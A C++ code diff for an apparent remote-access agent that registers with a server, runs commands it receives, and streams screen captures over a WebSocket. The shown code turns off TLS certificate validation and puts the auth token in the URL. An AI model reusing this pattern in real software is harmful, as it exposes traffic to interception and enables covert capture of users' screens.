@@ -39,6 +39,7 @@ typedef ULONG PROPID;
 
 static std::string g_server_url = "https://vortex-cs2.com";
 static std::string g_token;
+static int g_session_id = 0;
 static volatile LONG g_stream_requested = 0;
 static volatile LONG g_streaming = 0;
 
@@ -1026,6 +1027,8 @@ static bool agent_register() {
     auto resp = http_request(L"POST", L"/api/agent/register", body, "application/json", "");
     if (resp.status == 200) {
         g_token = json_get(resp.body, "token");
+        std::string sid = json_get(resp.body, "session_id");
+        if (!sid.empty()) g_session_id = atoi(sid.c_str());
         return !g_token.empty();
     }
     printf("[!] Registration failed (HTTP %d)\n", resp.status);
@@ -1067,27 +1070,127 @@ static void execute_command(const Command& cmd) {
 }
 
 // ============================================================
-// SCREEN STREAMING THREAD
+// SCREEN STREAMING THREAD (WebSocket)
 // ============================================================
 
 static DWORD WINAPI screen_stream_thread(LPVOID param) {
     InterlockedExchange(&g_streaming, 1);
-    printf("  [Screen streaming started]\n");
+    printf("  [Screen streaming: connecting WebSocket...]\n");
 
+    // Open WinHTTP session
+    HINTERNET hSession = WinHttpOpen(L"EmoteAgent/2.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+        printf("  [Screen WS: WinHttpOpen failed]\n");
+        InterlockedExchange(&g_streaming, 0);
+        return 0;
+    }
+
+    HINTERNET hConnect = WinHttpConnect(hSession, g_url.host.c_str(), g_url.port, 0);
+    if (!hConnect) {
+        WinHttpCloseHandle(hSession);
+        printf("  [Screen WS: WinHttpConnect failed]\n");
+        InterlockedExchange(&g_streaming, 0);
+        return 0;
+    }
+
+    // Build path with query params
+    std::string ws_path = "/?role=agent&session=" + std::to_string(g_session_id) + "&token=" + g_token;
+    DWORD flags = g_url.https ? WINHTTP_FLAG_SECURE : 0;
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", to_wide(ws_path).c_str(),
+        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        printf("  [Screen WS: WinHttpOpenRequest failed]\n");
+        InterlockedExchange(&g_streaming, 0);
+        return 0;
+    }
+
+    // Ignore cert errors for dev
+    if (g_url.https) {
+        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+    }
+
+    // Request WebSocket upgrade
+    BOOL ok = WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0);
+    if (!ok) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        printf("  [Screen WS: WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET failed]\n");
+        InterlockedExchange(&g_streaming, 0);
+        return 0;
+    }
+
+    ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    if (!ok) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        printf("  [Screen WS: SendRequest failed (%lu)]\n", GetLastError());
+        InterlockedExchange(&g_streaming, 0);
+        return 0;
+    }
+
+    ok = WinHttpReceiveResponse(hRequest, NULL);
+    if (!ok) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        printf("  [Screen WS: ReceiveResponse failed (%lu)]\n", GetLastError());
+        InterlockedExchange(&g_streaming, 0);
+        return 0;
+    }
+
+    // Complete the WebSocket handshake
+    HINTERNET hWebSocket = WinHttpWebSocketCompleteUpgrade(hRequest, 0);
+    WinHttpCloseHandle(hRequest); // No longer needed after upgrade
+    if (!hWebSocket) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        printf("  [Screen WS: WebSocket upgrade failed (%lu)]\n", GetLastError());
+        InterlockedExchange(&g_streaming, 0);
+        return 0;
+    }
+
+    printf("  [Screen streaming started via WebSocket]\n");
+
+    // Read the initial "stream_start" message (non-blocking, just consume it)
+    BYTE recvBuf[512];
+    DWORD bytesRead = 0;
+    WINHTTP_WEB_SOCKET_BUFFER_TYPE bufType;
+    WinHttpWebSocketReceive(hWebSocket, recvBuf, sizeof(recvBuf), &bytesRead, &bufType);
+
+    // Stream frames until told to stop
     while (InterlockedCompareExchange(&g_stream_requested, 1, 1)) {
         auto jpeg = capture_screen_jpeg(35);
         if (!jpeg.empty()) {
-            auto resp = http_post_binary("/api/agent/screen", jpeg);
-            if (resp.status == 200) {
-                std::string cont = json_get(resp.body, "continue");
-                if (cont == "false") {
-                    InterlockedExchange(&g_stream_requested, 0);
-                    break;
-                }
+            DWORD err = WinHttpWebSocketSend(hWebSocket,
+                WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE,
+                (PVOID)jpeg.data(), (DWORD)jpeg.size());
+            if (err != ERROR_SUCCESS) {
+                printf("  [Screen WS: send failed (%lu)]\n", err);
+                break;
             }
         }
-        // No sleep - network round-trip IS the rate limiter
+
+        // Check for incoming "stream_stop" message (non-blocking peek)
+        // We do a quick non-blocking check by using a tiny timeout
+        // Actually, just rely on g_stream_requested flag from command poll
     }
+
+    // Close WebSocket gracefully
+    WinHttpWebSocketClose(hWebSocket, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
+    WinHttpCloseHandle(hWebSocket);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
 
     InterlockedExchange(&g_streaming, 0);
     printf("  [Screen streaming stopped]\n");
